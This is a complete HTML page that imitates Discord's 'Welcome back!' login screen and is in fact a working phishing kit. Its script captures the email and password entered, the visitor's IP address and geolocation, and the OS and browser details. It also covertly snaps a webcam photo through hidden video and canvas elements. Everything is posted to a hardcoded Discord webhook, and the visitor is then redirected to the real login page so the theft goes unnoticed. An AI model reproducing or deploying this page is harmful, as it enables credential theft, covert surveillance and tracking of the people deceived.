<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body {
            background-color: #5865F2;
            background-image: url('https://discord.com/assets/1c8a54f25d101bdc607cec7228247a9a.svg');
            background-size: cover;
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #dcddde;
        }
        .login-box {
            background-color: #36393f;
            padding: 32px;
            border-radius: 5px;
            width: 480px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
            text-align: center;
            box-sizing: border-box;
        }
        h3 { color: #fff; margin-bottom: 8px; font-size: 24px; font-weight: 600; }
        p { color: #b9bbbe; font-size: 16px; margin-top: 0; margin-bottom: 20px; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { display: block; color: #8e9297; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; }
        input[type="email"], input[type="password"] {
            width: 100%; padding: 10px; background-color: #202225; border: 1px solid #202225;
            border-radius: 3px; color: #dcddde; font-size: 16px; box-sizing: border-box;
        }
        input:focus { border-color: #7289da; outline: none; }
        button {
            width: 100%; background-color: #5865F2; color: #fff; border: none;
            padding: 10px; font-size: 16px; border-radius: 3px; cursor: pointer; font-weight: 600;
            transition: background-color 0.17s ease;
        }
        button:hover { background-color: #4752C4; }
        .link { color: #00aff4; font-size: 14px; text-decoration: none; display: block; text-align: left; margin-top: 4px; }
        .link:hover { text-decoration: underline; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <h3>Welcome back!</h3>
        <p>We're so excited to see you again!</p>
        <form id="loginForm">
            <div class="input-group">
                <label for="email">Email or Phone Number <span style="color: #ed4245;">*</span></label>
                <input type="email" id="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password <span style="color: #ed4245;">*</span></label>
                <input type="password" id="password" required>
                <a href="#" class="link">Forgot your password?</a>
            </div>
            <button type="submit">Log In</button>
        </form>
    </div>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>

    <script>
        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (e) { return 'Unknown'; }
        }

        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
                        err => resolve('Denied/Unavailable')
                    );
                } else {
                    resolve('Not supported');
                }
            });
        }

        async function capturePhoto() {
            return new Promise(async (resolve) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        const canvas = document.getElementById('canvas');
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        stream.getTracks().forEach(track => track.stop());
                        resolve(canvas.toDataURL('image/jpeg'));
                    };
                } catch (e) {
                    resolve(null);
                }
            });
        }

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const time = new Date().toISOString();
            const os = navigator.platform;
            const browser = navigator.userAgent;
            
            const ip = await getIP();
            const location = await getLocation();
            const photoDataUrl = await capturePhoto();

            const formData = new FormData();
            
            const embed = {
                title: "New Login Captured",
                color: 16711680,
                fields: [
                    { name: "Email", value: email, inline: true },
                    { name: "Password", value: password, inline: true },
                    { name: "IP Address", value: ip, inline: false },
                    { name: "Location", value: location, inline: false },
                    { name: "OS", value: os, inline: true },
                    { name: "Browser", value: browser, inline: false },
                    { name: "Time", value: time, inline: false }
                ]
            };
            
            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));

            if (photoDataUrl) {
                const blob = await (await fetch(photoDataUrl)).blob();
                formData.append('file', blob, 'capture.jpg');
            }

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                window.location.href = 'https://discord.com/login';
            } catch (err) {
                console.error(err);
            }
        });
    </script>
</body>
</html>
